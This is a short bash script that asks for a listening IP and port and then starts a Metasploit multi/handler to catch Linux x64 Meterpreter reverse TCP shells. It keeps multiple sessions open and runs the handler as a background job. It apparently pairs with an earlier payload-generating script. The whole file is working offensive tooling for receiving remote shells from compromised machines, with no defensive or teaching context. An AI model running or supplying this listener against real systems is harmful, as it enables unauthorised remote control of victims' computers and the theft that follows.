#!/bin/bash

# Prompt the user for the IP address to be used for reverse connection (LHOST)
read -p "Enter LHOST: " LHOST
# Prompt the user for the port to be used for reverse connection (LPORT)
read -p "Enter LPORT: " LPORT

# Use msfconsole to start a Metasploit multi-handler for the reverse TCP connection
# The payload type is set to match the one generated in the previous script (linux/x64/meterpreter/reverse_tcp)
# LHOST and LPORT are set based on user input
# The ExitOnSession option is set to false to allow multiple sessions
# The exploit -j command runs the exploit in the background as a job
msfconsole -qx "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j"

exit 0
